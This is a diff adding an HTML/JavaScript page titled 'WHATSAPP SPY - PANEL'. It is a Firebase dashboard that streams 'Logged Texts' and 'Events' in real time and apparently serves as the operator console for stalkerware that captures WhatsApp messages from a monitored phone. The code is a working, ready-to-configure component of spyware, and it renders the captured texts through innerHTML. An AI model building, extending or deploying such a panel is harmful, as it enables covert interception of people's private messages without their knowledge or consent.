@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WHATSAPP-SPY - Firebase Data Viewer</title>
+    <style>
+		:root {
+			--primary-color: #25d366;
+			--primary-hover: #1da851;
+			--accent-color: #075e54;
+			--success-color: #2ecc71;
+			--success-hover: #27ae60;
+			--danger-color: #ff4d4f;
+			--danger-hover: #e53935;
+			--warning-color: #fbc02d;
+			--info-color: #26c6da;
+
+			--text-primary: #e6f5ec;
+			--text-secondary: #a8b5ae;
+			--text-muted: #7c8b85;
+
+			--bg-primary: #0c1317;
+			--bg-secondary: #111b21;
+			--bg-tertiary: #1e2a30;
+			--bg-glass: rgba(12, 19, 23, 0.6);
+
+			--border-color: #1f2c33;
+			--border-light: #2a3b41;
+
+			--shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.3);
+			--shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.5), 0 2px 4px -2px rgba(0, 0, 0, 0.4);
+			--shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.6), 0 4px 6px -4px rgba(0, 0, 0, 0.5);
+
+			--radius-sm: 0.375rem;
+			--radius-md: 0.75rem;
+			--radius-lg: 1rem;
+			--transition: all 0.3s ease-in-out;
+		}
+
+
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: var(--text-primary);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+
+        .card {
+            background: var(--bg-primary);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-lg);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+
+		.status-indicator {
+			display: inline-flex;
+			align-items: center;
+			gap: 0.5rem;
+			padding: 0.75rem 1.5rem;
+			border-radius: 9999px;
+			font-weight: 600;
+			font-size: 0.875rem;
+			margin: 1.5rem auto 0;
+			position: relative;
+			z-index: 1;
+			transition: var(--transition);
+			box-shadow: var(--shadow-md);
+		}
+
+		/* Estado: Conectado */
+		.status-connected {
+			background: #1f2b24; /* dark green-ish for contrast */
+			color: #25d366;
+			border: 1px solid #25d366;
+			box-shadow: 0 0 10px rgba(37, 211, 102, 0.4);
+		}
+
+		/* Estado: Desconectado */
+		.status-disconnected {
+			background: rgba(255, 77, 79, 0.15);
+			color: #ff4d4f;
+			border: 1px solid rgba(255, 77, 79, 0.4);
+		}
+
+		/* Ponto de status animado */
+		.status-dot {
+			width: 10px;
+			height: 10px;
+			border-radius: 50%;
+			animation: pulse 1.5s infinite;
+		}
+
+		/* Ponto: verde vibrante para conectado */
+		.status-connected .status-dot {
+			background: #25d366;
+		}
+
+		/* Ponto: vermelho vibrante para desconectado */
+		.status-disconnected .status-dot {
+			background: #ff4d4f;
+		}
+
+		/* Animação de pulso */
+		@keyframes pulse {
+			0% {
+				transform: scale(1);
+				opacity: 1;
+			}
+			50% {
+				transform: scale(1.4);
+				opacity: 0.6;
+			}
+			100% {
+				transform: scale(1);
+				opacity: 1;
+			}
+		}
+
+
+        .controls {
+            padding: 1.5rem 2rem;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-light);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 52px;
+            height: 28px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--border-color);
+            transition: var(--transition);
+            border-radius: 9999px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 4px;
+            bottom: 4px;
+            background: white;
+            transition: var(--transition);
+            border-radius: 50%;
+            box-shadow: var(--shadow-sm);
+        }
+
+        input:checked + .slider {
+            background: var(--success-color);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+
+        .toggle-label {
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: var(--radius-md);
+            font-weight: 500;
+            font-size: 0.875rem;
+            cursor: pointer;
+            transition: var(--transition);
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .btn-primary {
+            background: var(--primary-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-success {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: var(--success-hover);
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-warning {
+            background: var(--warning-color);
+            color: white;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .tabs {
+            display: flex;
+            background: var(--bg-tertiary);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 1rem 1.5rem;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            font-weight: 500;
+            color: var(--text-secondary);
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .tab-button:hover {
+            background: rgba(37, 99, 235, 0.05);
+            color: var(--primary-color);
+        }
+
+        .tab-button.active {
+            color: var(--primary-color);
+            background: var(--bg-primary);
+        }
+
+        .tab-button.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--primary-color);
+            border-radius: 3px 3px 0 0;
+        }
+
+        .tab-content {
+            display: none;
+            padding: 2rem;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .entry {
+            background: var(--bg-primary);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-md);
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .entry:hover {
+            border-color: var(--border-color);
+            box-shadow: var(--shadow-sm);
+            transform: translateY(-1px);
+        }
+
+        .entry.new-entry {
+            animation: slideInNew 0.5s ease-out;
+            border-color: var(--success-color);
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.05), rgba(16, 185, 129, 0.02));
+        }
+
+        .entry.new-entry::before {
+            content: 'NEW';
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--success-color);
+            color: white;
+            padding: 0.25rem 0.5rem;
+            border-radius: var(--radius-sm);
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        @keyframes slideInNew {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .entry-date {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .entry-date::before {
+            content: '📅';
+            font-size: 1rem;
+        }
+
+        .event-type {
+            display: inline-flex;
+            align-items: center;
+            background: var(--primary-color);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-weight: 600;
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+        }
+
+        .event-message {
+            color: var(--text-primary);
+            line-height: 1.7;
+        }
+
+        .entry-content {
+            color: var(--text-primary);
+            line-height: 1.7;
+            white-space: pre-line;
+        }
+
+        .load-more {
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            padding: 2rem;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-top: 2px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 3rem 2rem;
+            color: var(--text-muted);
+        }
+
+        .empty-state-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .header {
+                padding: 1.5rem 1rem;
+            }
+
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .controls {
+                padding: 1rem;
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .tab-content {
+                padding: 1rem;
+            }
+
+            .entry {
+                padding: 1rem;
+            }
+
+            .tabs {
+                flex-direction: column;
+            }
+
+            .tab-button {
+                text-align: left;
+            }
+        }
+
+        /* Dark mode support */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --text-primary: #f9fafb;
+                --text-secondary: #d1d5db;
+                --text-muted: #9ca3af;
+                --bg-primary: #1f2937;
+                --bg-secondary: #111827;
+                --bg-tertiary: #374151;
+                --border-color: #374151;
+                --border-light: #4b5563;
+            }
+
+            body {
+                background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            }
+        }
+
+        /* Smooth scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-tertiary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>WHATSAPP SPY - PANEL</h1>
+                <p>Firebase Data Viewer - Real-time Monitoring</p>
+                <div id="connection-status" class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span>Connecting to Firebase...</span>
+                </div>
+            </div>
+            
+            <div class="controls">
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="realtime-toggle" checked>
+                        <span class="slider"></span>
+                    </label>
+                    <span class="toggle-label">Realtime Updates</span>
+                </div>
+                <button id="clear-new-button" class="btn btn-warning" style="display:none;">
+                    Clear New Entries (0)
+                </button>
+            </div>
+            
+            <div class="tabs">
+                <button class="tab-button active" onclick="openTab(event, 'logs-tab')">
+                    📝 Logged Texts
+                </button>
+                <button class="tab-button" onclick="openTab(event, 'events-tab')">
+                    ⚡ Events
+                </button>
+            </div>
+            
+            <div id="logs-tab" class="tab-content active">
+                <div id="logs-container">
+                    <!-- Logs will be inserted here -->
+                </div>
+                <div id="logs-empty" class="empty-state" style="display:none;">
+                    <div class="empty-state-icon">📝</div>
+                    <p>No logged texts found</p>
+                </div>
+                <div id="logs-loading" class="loading" style="display:none;">
+                    <div class="spinner"></div>
+                    <span>Loading logs...</span>
+                </div>
+                <div class="load-more">
+                    <button id="logs-load-more-btn" class="btn btn-primary">Load More</button>
+                </div>
+            </div>
+            
+            <div id="events-tab" class="tab-content">
+                <div id="events-container">
+                    <!-- Events will be inserted here -->
+                </div>
+                <div id="events-empty" class="empty-state" style="display:none;">
+                    <div class="empty-state-icon">⚡</div>
+                    <p>No events found</p>
+                </div>
+                <div id="events-loading" class="loading" style="display:none;">
+                    <div class="spinner"></div>
+                    <span>Loading events...</span>
+                </div>
+                <div class="load-more">
+                    <button id="events-load-more-btn" class="btn btn-primary">Load More</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+		  //Firebase config - Replace by your firebaseConfig
+		};
+        
+            // Initialize Firebase
+			firebase.initializeApp(firebaseConfig);
+			const database = firebase.database();
+			
+			// References to your data in Firebase
+			const logsRef = database.ref('LoggedTexts');
+			const eventsRef = database.ref('events');
+			
+			// Variables to track pagination and state
+			let logsLastKey = '';
+			let eventsLastKey = '';
+			const pageSize = 20;
+			let noMoreLogs = false;
+			let noMoreEvents = false;
+			let realtimeEnabled = true;
+			let newEntriesCount = 0;
+			let activeTab = 'logs';
+			
+			// Track initial load state
+			let initialLogsLoaded = false;
+			let initialEventsLoaded = false;
+			
+			// Connection status monitoring
+			const connectedRef = firebase.database().ref(".info/connected");
+			connectedRef.on("value", (snap) => {
+				const statusDiv = document.getElementById("connection-status");
+				if (snap.val() === true) {
+					statusDiv.innerHTML = '<div class="status-dot"></div><span>Connected to Firebase</span>';
+					statusDiv.className = "status-indicator status-connected";
+				} else {
+					statusDiv.innerHTML = '<div class="status-dot"></div><span>Disconnected from Firebase</span>';
+					statusDiv.className = "status-indicator status-disconnected";
+				}
+			});
+			
+			// Tab functionality
+			function openTab(evt, tabName) {
+				// Hide all tab content
+				const tabcontent = document.getElementsByClassName("tab-content");
+				for (let i = 0; i < tabcontent.length; i++) {
+					tabcontent[i].style.display = "none";
+				}
+				
+				// Remove "active" class from all tab buttons
+				const tabbuttons = document.getElementsByClassName("tab-button");
+				for (let i = 0; i < tabbuttons.length; i++) {
+					tabbuttons[i].className = tabbuttons[i].className.replace(" active", "");
+				}
+				
+				// Show the current tab and add "active" class to the button
+				document.getElementById(tabName).style.display = "block";
+				evt.currentTarget.className += " active";
+				
+				// Set active tab
+				activeTab = tabName === "logs-tab" ? "logs" : "events";
+				
+				// Load data if tab is empty
+				if (tabName === "logs-tab" && !initialLogsLoaded) {
+					loadLogs(true);
+				} else if (tabName === "events-tab" && !initialEventsLoaded) {
+					loadEvents(true);
+				}
+			}
+			
+			// Function to load logs
+			function loadLogs(isInitialLoad = false) {
+				if (noMoreLogs && !isInitialLoad) return;
+				
+				document.getElementById('logs-loading').style.display = 'block';
+				document.getElementById('logs-load-more-btn').disabled = true;
+				
+				// Create query to get logs in reverse chronological order
+				let query;
+				
+				if (isInitialLoad || !logsLastKey) {
+					// For initial load, get the most recent entries
+					query = logsRef.orderByKey().limitToLast(pageSize);
+				} else {
+					// For subsequent loads, get older entries before the lastKey
+					query = logsRef.orderByKey().endBefore(logsLastKey).limitToLast(pageSize);
+				}
+				
+				query.once('value')
+					.then(snapshot => {
+						const logs = [];
+						
+						// Convert snapshot to array and reverse to get newest first
+						const tempLogs = [];
+						snapshot.forEach(childSnapshot => {
+							tempLogs.push({
+								id: childSnapshot.key,
+								...childSnapshot.val()
+							});
+						});
+						
+						// Reverse to get newest first
+						tempLogs.reverse();
+						
+						// Store the logs and track the oldest key for next pagination
+						logs.push(...tempLogs);
+						
+						// The last item in our reversed array is the oldest, use its key for next pagination
+						if (logs.length > 0) {
+							logsLastKey = logs[logs.length - 1].id;
+						}
+						
+						// If we got less than pageSize logs, there are no more logs to load
+						if (logs.length < pageSize) {
+							noMoreLogs = true;
+						}
+						
+						// Display logs
+						displayLogs(logs, isInitialLoad);
+						initialLogsLoaded = true;
+						
+						document.getElementById('logs-loading').style.display = 'none';
+						document.getElementById('logs-load-more-btn').disabled = false;
+						
+						// Hide the "Load More" button if there are no more logs
+						if (noMoreLogs) {
+							document.getElementById('logs-load-more-btn').style.display = 'none';
+						}
+						
+						// Set up realtime listener after initial load
+						if (isInitialLoad) {
+							setupLogsRealtime();
+						}
+					})
+					.catch(error => {
+						console.error("Error fetching logs:", error);
+						document.getElementById('logs-loading').style.display = 'none';
+						document.getElementById('logs-load-more-btn').disabled = false;
+						alert("Error loading logs. See console for details.");
+					});
+			}
+			
+			// Function to load events
+			function loadEvents(isInitialLoad = false) {
+				if (noMoreEvents && !isInitialLoad) return;
+				
+				document.getElementById('events-loading').style.display = 'block';
+				document.getElementById('events-load-more-btn').disabled = true;
+				
+				// Create query to get events in reverse chronological order
+				let query;
+				
+				if (isInitialLoad || !eventsLastKey) {
+					// For initial load, get the most recent entries
+					query = eventsRef.orderByKey().limitToLast(pageSize);
+				} else {
+					// For subsequent loads, get older entries before the lastKey
+					query = eventsRef.orderByKey().endBefore(eventsLastKey).limitToLast(pageSize);
+				}
+				
+				query.once('value')
+					.then(snapshot => {
+						const events = [];
+						
+						// Convert snapshot to array and reverse to get newest first
+						const tempEvents = [];
+						snapshot.forEach(childSnapshot => {
+							tempEvents.push({
+								id: childSnapshot.key,
+								...childSnapshot.val()
+							});
+						});
+						
+						// Reverse to get newest first
+						tempEvents.reverse();
+						
+						// Store the events and track the oldest key for next pagination
+						events.push(...tempEvents);
+						
+						// The last item in our reversed array is the oldest, use its key for next pagination
+						if (events.length > 0) {
+							eventsLastKey = events[events.length - 1].id;
+						}
+						
+						// If we got less than pageSize events, there are no more events to load
+						if (events.length < pageSize) {
+							noMoreEvents = true;
+						}
+						
+						// Display events
+						displayEvents(events, isInitialLoad);
+						initialEventsLoaded = true;
+						
+						document.getElementById('events-loading').style.display = 'none';
+						document.getElementById('events-load-more-btn').disabled = false;
+						
+						// Hide the "Load More" button if there are no more events
+						if (noMoreEvents) {
+							document.getElementById('events-load-more-btn').style.display = 'none';
+						}
+						
+						// Set up realtime listener after initial load
+						if (isInitialLoad) {
+							setupEventsRealtime();
+						}
+					})
+					.catch(error => {
+						console.error("Error fetching events:", error);
+						document.getElementById('events-loading').style.display = 'none';
+						document.getElementById('events-load-more-btn').disabled = false;
+						alert("Error loading events. See console for details.");
+					});
+			}
+			
+			// Set up realtime listener for logs
+			function setupLogsRealtime() {
+				// Listen for new logs
+				logsRef.orderByKey().limitToLast(1).on('child_added', (snapshot) => {
+					// Skip if realtime is disabled
+					if (!realtimeEnabled) return;
+					
+					// Skip if this is one of the initial logs we already loaded
+					if (!initialLogsLoaded) return;
+					
+					const log = {
+						id: snapshot.key,
+						...snapshot.val()
+					};
+					
+					// Add new log to the top of the container
+					displayLogItem(log, true);
+					
+					// Increment new entries counter
+					newEntriesCount++;
+					updateNewEntriesButton();
+				});
+			}
+			
+			// Set up realtime listener for events
+			function setupEventsRealtime() {
+				// Listen for new events
+				eventsRef.orderByKey().limitToLast(1).on('child_added', (snapshot) => {
+					// Skip if realtime is disabled
+					if (!realtimeEnabled) return;
+					
+					// Skip if this is one of the initial events we already loaded
+					if (!initialEventsLoaded) return;
+					
+					const event = {
+						id: snapshot.key,
+						...snapshot.val()
+					};
+					
+					// Add new event to the top of the container
+					displayEventItem(event, true);
+					
+					// Increment new entries counter
+					newEntriesCount++;
+					updateNewEntriesButton();
+				});
+			}
+			
+			// Function to update the "Clear New Entries" button
+			function updateNewEntriesButton() {
+				const clearButton = document.getElementById('clear-new-button');
+				if (newEntriesCount > 0) {
+					clearButton.textContent = `Clear New Entries (${newEntriesCount})`;
+					clearButton.style.display = 'block';
+				} else {
+					clearButton.style.display = 'none';
+				}
+			}
+			
+			// Function to clear new entry highlighting
+			function clearNewEntries() {
+				const newEntries = document.querySelectorAll('.new-entry');
+				newEntries.forEach(entry => {
+					entry.classList.remove('new-entry');
+				});
+				newEntriesCount = 0;
+				updateNewEntriesButton();
+			}
+			
+			// Function to display logs
+			function displayLogs(logs, isInitialLoad) {
+				const logsContainer = document.getElementById('logs-container');
+				
+				// Clear container if this is the initial load
+				if (isInitialLoad) {
+					logsContainer.innerHTML = '';
+				}
+				
+				// Display each log entry (always append for proper chronological order)
+				logs.forEach(log => {
+					displayLogItem(log, false, 'append');
+				});
+			}
+			
+			// Display a single log item
+			function displayLogItem(log, isNew = false, position = 'prepend') {
+				const logsContainer = document.getElementById('logs-container');
+				
+				const logElement = document.createElement('div');
+				logElement.className = 'entry' + (isNew ? ' new-entry' : '');
+				logElement.id = `log-${log.id}`;
+				
+				const dateElement = document.createElement('div');
+				dateElement.className = 'entry-date';
+				dateElement.textContent = log.Date || 'No date';
+				
+				const contentElement = document.createElement('div');
+				contentElement.className = 'entry-content';
+				// The Texts field already has HTML line breaks from our Java code
+				contentElement.innerHTML = log.Texts || 'No content';
+				
+				logElement.appendChild(dateElement);
+				logElement.appendChild(contentElement);
+				
+				if (position === 'prepend') {
+					// Add to the top of the list (for new real-time entries)
+					logsContainer.insertBefore(logElement, logsContainer.firstChild);
+				} else {
+					// Add to the bottom of the list (for load more)
+					logsContainer.appendChild(logElement);
+				}
+			}
+			
+			// Function to display events
+			function displayEvents(events, isInitialLoad) {
+				const eventsContainer = document.getElementById('events-container');
+				
+				// Clear container if this is the initial load
+				if (isInitialLoad) {
+					eventsContainer.innerHTML = '';
+				}
+				
+				// Display each event entry (always append for proper chronological order)
+				events.forEach(event => {
+					displayEventItem(event, false, 'append');
+				});
+			}
+			
+			// Display a single event item
+			function displayEventItem(event, isNew = false, position = 'prepend') {
+				const eventsContainer = document.getElementById('events-container');
+				
+				const eventElement = document.createElement('div');
+				eventElement.className = 'entry' + (isNew ? ' new-entry' : '');
+				eventElement.id = `event-${event.id}`;
+				
+				const dateElement = document.createElement('div');
+				dateElement.className = 'entry-date';
+				dateElement.textContent = event.Date || 'No date';
+				
+				const eventTypeElement = document.createElement('div');
+				eventTypeElement.className = 'event-type';
+				eventTypeElement.textContent = event.Event || 'No event type';
+				
+				const messageElement = document.createElement('div');
+				messageElement.className = 'event-message';
+				messageElement.textContent = event.Message || 'No message';
+				
+				eventElement.appendChild(dateElement);
+				eventElement.appendChild(eventTypeElement);
+				eventElement.appendChild(messageElement);
+				
+				if (position === 'prepend') {
+					// Add to the top of the list (for new real-time entries)
+					eventsContainer.insertBefore(eventElement, eventsContainer.firstChild);
+				} else {
+					// Add to the bottom of the list (for load more)
+					eventsContainer.appendChild(eventElement);
+				}
+			}
+			
+			// Initial setup
+			document.addEventListener('DOMContentLoaded', () => {
+				// Load logs initially
+				loadLogs(true);
+				
+				// Add event listeners for "Load More" buttons
+				document.getElementById('logs-load-more-btn').addEventListener('click', () => {
+					loadLogs();
+				});
+				
+				document.getElementById('events-load-more-btn').addEventListener('click', () => {
+					loadEvents();
+				});
+				
+				// Add event listener for realtime toggle
+				document.getElementById('realtime-toggle').addEventListener('change', (e) => {
+					realtimeEnabled = e.target.checked;
+					if (!realtimeEnabled) {
+						// Detach realtime listeners
+						logsRef.off();
+						eventsRef.off();
+					} else {
+						// Re-attach realtime listeners
+						setupLogsRealtime();
+						setupEventsRealtime();
+					}
+				});
+				
+				// Add event listener for clearing new entries
+				document.getElementById('clear-new-button').addEventListener('click', clearNewEntries);
+			});
+</script>
+</body>
+</html>
